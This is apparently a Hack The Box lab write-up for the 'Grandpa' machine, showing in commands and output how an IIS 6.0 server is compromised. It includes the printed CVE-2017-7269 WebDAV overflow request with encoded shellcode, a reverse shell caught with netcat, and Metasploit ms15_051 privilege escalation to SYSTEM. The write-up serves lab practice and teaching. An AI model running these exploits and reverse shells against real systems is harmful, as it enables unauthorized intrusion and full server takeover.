### Grandpa HTB

### Difficulty = Easy

### IP Address = 10.10.10.14

Nmap Scan:

```
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Grandpa]
└─$ nmap -sCV -A 10.10.10.14 -p80 -oN nmapscan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-23 07:44 WAT
Nmap scan report for 10.10.10.14
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Date: Mon, 23 Jan 2023 06:45:04 GMT
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.04 seconds
```

Only one port open which is 80 (http)

From what nmap fingerprinted we can see has various http request method 

And the one of interest to us is `PUT`

Because we will be able to upload files to the server

Lets try it out

Since its webdav i will connect to it using cadaver

It failed to upload 

```                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Grandpa]
└─$ echo Pwn3d > test                           
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Grandpa]
└─$ cadaver http://10.10.10.14
dav:/> put
The `put' command requires 1 argument:
  put local [remote] : Upload local file
dav:/> put test
Uploading test to `/test':
Progress: [=============================>] 100.0% of 6 bytes failed:
403 Forbidden
dav:/> 

```

Now i will try using davtest to see if it allows any file with a specific extension to be uploaded

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Grandpa]
└─$ davtest -url http://10.10.10.14
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.14
********************************************************
NOTE    Random string for this session: BiteRTS
********************************************************
 Creating directory
MKCOL           FAIL
********************************************************
 Sending test files
PUT     php     FAIL
PUT     aspx    FAIL
PUT     jsp     FAIL
PUT     txt     FAIL
PUT     pl      FAIL
PUT     shtml   FAIL
PUT     cfm     FAIL
PUT     jhtml   FAIL
PUT     cgi     FAIL
PUT     html    FAIL
PUT     asp     FAIL

********************************************************
/usr/bin/davtest Summary:
```

Too bad it doesn't 

Anyways looking at the IIS version it looks very old 

Searching for exploit leads to this [Exploit](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269)

```
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Grandpa]
└─$ python2 exploit.py
usage:iis6webdav.py targetip targetport reverseip reverseport

```

Now i'll run the script again giving it the required arguments

```
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Grandpa]
└─$ python2 exploit.py
usage:iis6webdav.py targetip targetport reverseip reverseport

                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Grandpa]
└─$ python2 exploit.py 10.10.10.14 80 10.10.16.7 1337
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa_______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________> (Not <locktoken:write1>) <http://localhost/bbbbbbb__________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>


```

It hangs but back on the listener

```
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Grandpa]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.14] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>cd \users
cd \users
The system cannot find the path specified.

c:\windows\system32\inetsrv>cd c:\
cd c:\

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FDCB-B9EF

 Directory of C:\

04/12/2017  04:27 PM    <DIR>          ADFS
04/12/2017  04:04 PM                 0 AUTOEXEC.BAT
04/12/2017  04:04 PM                 0 CONFIG.SYS
04/12/2017  04:32 PM    <DIR>          Documents and Settings
04/12/2017  04:17 PM    <DIR>          FPSE_search
04/12/2017  04:17 PM    <DIR>          Inetpub
12/24/2017  07:18 PM    <DIR>          Program Files
01/23/2023  08:54 AM    <DIR>          WINDOWS
04/12/2017  04:05 PM    <DIR>          wmpub
               2 File(s)              0 bytes
               7 Dir(s)   1,318,838,272 bytes free

```

Now i'll get a more shell to metasploit so i can check for vulnerabilities

If you have been reading my other writeups you will now the process already 

As am not going to say it here

After using the exploit suggester from msf here's the result

```
meterpreter > background                                                                                                                                                                                          
[*] Backgrounding session 1...                                                                                                                                                                                    
msf6 post(multi/recon/local_exploit_suggester) > options                                                                                                                                                          
                                                                                                                                                                                                                  
Module options (post/multi/recon/local_exploit_suggester):                                                                                                                                                        
                                                                                                                                                                                                                  
   Name             Current Setting  Required  Description                                                                                                                                                        
   ----             ---------------  --------  -----------                                                                                                                                                        
   SESSION          1                yes       The session to run this module on                                                                                                                                  
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits                                                                                                         
                                                                                                                                                                                                                  
msf6 post(multi/recon/local_exploit_suggester) > run                                                                                                                                                              
                                                                                                                                                                                                                  
[*] 10.10.10.14 - Collecting local exploits for x86/windows...                                                                                                                                                    
[*] 10.10.10.14 - 167 exploit checks are being tried...                                                                                                                                                           
[-] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image                                                                                                                                                         
[*] Post module execution completed      
```

Now i'll use the exploit msf gave

```
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_image                                                                                                             
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms15_051_client_copy_image) > options
Module options (exploit/windows/local/ms15_051_client_copy_image):                                                                                                                                                
   Name     Current Setting  Required  Description                                                                                                                                                                
   ----     ---------------  --------  -----------                                                                                                                                                                
   SESSION                   yes       The session to run this module on                                                                                                                                          

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description                                                                                                                                                               
   ----      ---------------  --------  -----------                                                                                                                                                               
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)                                                                                                                 
   LHOST     192.168.220.131  yes       The listen address (an interface may be specified)                                                                                                                        
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name                                                                                                                                                                                                       
   --  ----                                                                                                                                                                                                       
   0   Windows x86


msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1
session => 1
msf6 exploit(windows/local/ms15_051_client_copy_image) > set lhost tun0
lhost => tun0
msf6 exploit(windows/local/ms15_051_client_copy_image) > run

[*] Started reverse TCP handler on 10.10.16.7:4444 
[*] Reflectively injecting the exploit DLL and executing it...
[*] Launching netsh to host the DLL...
[+] Process 3440 launched.
[*] Reflectively injecting the DLL into 3440...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175686 bytes) to 10.10.10.14
[*] Meterpreter session 2 opened (10.10.16.7:4444 -> 10.10.10.14:1043) at 2023-01-25 14:21:57 +0100

meterpreter > whoami
[-] Unknown command: whoami
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```

And we're done

<br> <br>
[Back To Home](../../index.md)
<br>



